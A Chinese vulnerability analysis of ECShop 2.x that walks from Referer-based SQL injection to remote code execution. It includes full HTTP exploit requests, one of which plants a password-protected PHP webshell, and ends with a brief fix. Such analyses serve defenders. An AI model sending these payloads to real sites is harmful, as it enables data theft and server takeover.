作者：ringk3y  
作者博客：<http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/>

### 前言

问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行

### 漏洞分析

#### 0x01-SQL注入

先看user.php

![](https://images.seebug.org/content/images/2018/09/7bce43d9-d895-42ac-bc7d-4b81f212873f.png-w331s)

`$back_act`变量来源于`HTTP_REFERER`，我们可控。

assign函数用于在模版变量里赋值

![
](https://images.seebug.org/content/images/2018/09/5f8f004b-ad37-4176-84a3-703d18505492.png-w331s)

再看display函数

![](https://images.seebug.org/content/images/2018/09/d976867c-f11d-429f-b540-773eac3c80ad.png-w331s)

**读取`user_passport.dwt`模版文件内容，显示解析变量后的html内容，用`_echash`做分割，得到`$k`然后交给`isnert_mod`处理，由于`_echash`是默认的，不是随机生成的，所以$val内容可随意控制。**

再看`insert_mod`函数

![](https://images.seebug.org/content/images/2018/09/6e277d59-15f8-4ab6-bd33-946088a3dbe7.png-w331s)

非常关键的一个地方，这里进行了动态调用

$val传入进来用|分割，参数传入进来时需要被序列化

再看`include/lib_insert.php`中的`insert_ads`函数

![](https://images.seebug.org/content/images/2018/09/1c264f29-086c-42f4-b12d-32c2a7176401.png-w331s)

可以看到这里直接就能注入了

payload:

    
    
    GET /user.php?act=login HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0

![](https://images.seebug.org/content/images/2018/09/cc84184a-63b6-4699-b4f8-01f2fad489c4.png-w331s)

#### 0x02-代码执行

![](https://images.seebug.org/content/images/2018/09/00225ae3-60b2-4225-ae40-c78c5f72bea9.png-w331s)

继续看fetch函数

![](https://images.seebug.org/content/images/2018/09/4049579f-228a-4207-b7e6-6e38c42d2110.png-w331s)

追踪`_eval`函数

![](https://images.seebug.org/content/images/2018/09/4fad8419-bf75-47b0-b6cb-fa512e989a38.png-w331s)

`$position_style`变量来源于数据库中的查询结构

![](https://images.seebug.org/content/images/2018/09/65506bc5-3eb0-42f6-9fc3-f31c4ecab7a4.png-w331s)

然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询

![](https://images.seebug.org/content/images/2018/09/3aa4d5cb-9368-4140-a5a9-8dcae663ee8f.png-w331s)

payload

    
    
    SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1535678679' AND end_time >= '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- -
函数中有一个判断

![](https://images.seebug.org/content/images/2018/09/b7bbfdf3-ecb7-4023-8135-f48464ced59c.png-w331s)

我们 id传入`’/*`

num传入`*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -`就能绕过了

![](https://images.seebug.org/content/images/2018/09/e7b26bf9-e837-41c7-bb57-3ea429742a5c.png-w331s)

var_dump一下

![](https://images.seebug.org/content/images/2018/09/ff0bcbf5-a94e-453b-80db-4195971f1f48.png-w331s)

![](https://images.seebug.org/content/images/2018/09/34c8bda8-f89f-43f4-9c0a-5914b2a5a663.png-w331s)

再看fetch函数,传入的参数被fetch_str函数处理了

![](https://images.seebug.org/content/images/2018/09/a2c6d6db-3c96-4978-9136-0aa667fc1218.png-w331s)

追踪fetch_str函数，这里的字符串处理流程比较复杂

![](https://images.seebug.org/content/images/2018/09/7a3135a6-510a-4c02-9392-06ea115edb27.png-w331s)

    
    
    return preg_replace("/{([^\}\{\n]*)}/e", "\$this->select('\\1');", $source);

这一行意思是比如`$source`是`xxxx{$asd}xxx`,那么经过这行代码处理后就是返回`this->select(‘$asd’)`的结果

看看select函数

![](https://images.seebug.org/content/images/2018/09/79a2b876-467c-4ade-a6eb-04cfd21f90c8.png-w331s)

第一个字符为$时进入`$this->get_val`函数

![](https://images.seebug.org/content/images/2018/09/761907c9-f14b-4353-9a95-1c4b12540d68.png-w331s)

我们`$val`没有`.$`又进入`make_var`函数

![](https://images.seebug.org/content/images/2018/09/f90a5572-2f54-4b9b-a578-4da5bea7c6ea.png-w331s)

最后这里引入单引号从变量中逃逸

![
](https://images.seebug.org/content/images/2018/09/b84cdf57-e323-4e13-8ea3-13add838e03c.png-w331s)

我们要闭合`_var`所以最终payload是

    
    
    {$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ=='));//}xxx

会在网站跟目录生成1.txt 里面内容是getshell

![](https://images.seebug.org/content/images/2018/09/2a808c20-6361-48f1-ae1c-96b6b9d05a2f.png-w331s)

GETSHELL exp:

    
    
    GET /user.php?act=login HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0

会在网站根目录生成1.php 密码是1337

### 修复建议

`intval $arr[id]`和`$arr[num]`

### thanks

感谢xyz老哥

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/691/>

